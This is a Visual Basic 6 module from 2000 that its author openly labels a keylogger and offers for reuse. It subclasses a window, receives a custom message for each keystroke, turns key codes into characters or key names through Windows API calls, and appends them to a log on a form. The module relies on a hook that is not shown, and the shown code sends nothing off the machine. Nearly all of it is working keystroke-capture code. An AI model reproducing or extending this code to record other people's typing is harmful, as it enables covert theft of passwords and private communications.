Attribute VB_Name = "Main"
'Module for the keylogger, Copyright© 2000, Konstantin Tretyakov
'If you use this in your program, don't forget about me (in some greetingz section, or kinda)
'Thanx, have fun
'Konstantin Tretyakov (kt_ee@hotmail.com)

Option Explicit
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function DefWindowProc Lib "user32" Alias "DefWindowProcA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Public Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long) As Long
Public Const GWL_WNDPROC = (-4)
Public PrevFuncPointer As Long

'This is the message that will be fired to the specified window
'when a key is pressed
Public Const MyOwnMessage = &H102 'Too large numbers don't work (WHY???)

'Functions for recognising the pressed key's name
Private Declare Function ToAscii Lib "user32" (ByVal uVirtKey As Long, ByVal uScanCode As Long, lpbKeyState As Byte, lpwTransKey As Long, ByVal fuState As Long) As Long
Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
Private Declare Function GetKeyNameText Lib "user32" Alias "GetKeyNameTextA" (ByVal lParam As Long, ByVal lpBuffer As String, ByVal nSize As Long) As Long

Public KeyboardState(0 To 255) As Byte 'Needed for the ToAscii function




Public Function Window_OnMessage(ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    'Here wParam - Virtual KeyCode, lParam - Keyboard ScanCode
    Dim TempRes As Long, KeyAscii As Long, KeyName As String
    
    'Is this the required message?
    If Msg = MyOwnMessage Then
    'Now record the key pressed
        If (lParam And &H80000000) = 0 Then 'If true, then there was a KeyDown event, else - KeyUp
            If GetKeyboardState(KeyboardState(0)) = 0 Then GoTo ByeBye  'Needed for the ToAscii
            TempRes = ToAscii(wParam, lParam, KeyboardState(0), KeyAscii, 0)
            If (TempRes = 1) And ((KeyAscii > 31) Or (KeyAscii = 13)) Then
            'Key my be just added to the log
                If KeyAscii <> 13 Then
                    frmMain.txtLog = frmMain.txtLog & Chr(KeyAscii)
                Else
                    frmMain.txtLog = frmMain.txtLog & vbCrLf
                End If
            Else
            'That is some control key, get its name
                KeyName = String(20, " ")
                TempRes = GetKeyNameText(lParam, KeyName, 20)
                If TempRes <> 0 Then
                    KeyName = Left(KeyName, TempRes)
                    frmMain.txtLog = frmMain.txtLog & "{" & KeyName & "}"
                End If
            End If
ByeBye:
        Else
            'You may also process the KeyUp events also,
            'but if you log them together with KeyDown events,
            'the log will be a bit unreadable
        End If
    End If
    'Pass the procedure to the default handler
    
    Window_OnMessage = CallWindowProc(PrevFuncPointer, hWnd, Msg, wParam, lParam)
End Function
